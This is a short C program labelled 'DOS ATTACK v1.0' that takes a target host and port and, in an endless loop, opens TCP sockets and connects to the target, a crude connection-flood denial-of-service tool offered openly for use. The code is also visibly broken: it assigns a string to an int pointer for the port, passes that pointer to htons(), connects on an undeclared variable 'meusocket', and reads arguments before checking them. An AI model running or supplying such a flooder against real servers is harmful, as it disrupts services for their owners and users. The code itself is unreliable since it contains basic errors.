#include <stdio.h>
#include <netdb.h>

int main(int argc, char * argv[]){
	
	int mysocket;
	int conect;

	int * port;
	char * target;
	
	target=argv[1];
	port = argv[2];

	struct sockaddr_in alvo;

	if(argc < 2){
		printf("|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|\n");
		printf("|-|-|-|-|-|-|-|-|-|-|-|.. DOS ATTACK v1.0 |-|-|-|-|-|-|-|-|-|-|-|-|-|\n");
		printf("|-|-|-|-|-|-|-|-| Use: ./dos-attack target.com.ch  port |-|-|-|-|-|-|-|\n");
		printf("|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|\n");
		return(0);
	}

	while(1)
	{
		mysocket=socket(AF_INET,SOCK_STREAM,0);
		alvo.sin_family=AF_INET;
		alvo.sin_port=htons(port);
		alvo.sin_addr.s_addr=inet_addr(target);
		conect=connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);
	}

	close(mysocket);
	close(conect);
}
